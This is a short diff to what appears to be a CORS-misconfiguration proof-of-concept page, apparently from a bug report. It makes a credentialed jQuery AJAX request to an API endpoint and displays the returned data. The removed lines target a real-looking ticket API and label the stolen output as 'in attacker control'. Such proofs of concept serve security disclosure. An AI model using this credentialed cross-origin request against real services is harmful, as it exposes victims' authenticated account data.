@@ -4,12 +4,12 @@
 <script type="text/javascript">
 function aj() {
 $.ajax({
-    url : 'https://bugs.freshdesk.com/api/v2/tickets',
+    url : 'https://sub.main.com/api/',
     type : 'GET',
     dataType:'json',
     success : function(data) {              
         var x= JSON.stringify(data);
-        document.getElementById('test').innerHTML = "THE FOLLOWING DATA IS IN ATTACKER CONTROL:      "+ x;
+        document.getElementById('test').innerHTML = "THE FOLLOWING DATA IS IN :      "+ x;
     },
     xhrFields: {
        withCredentials: true
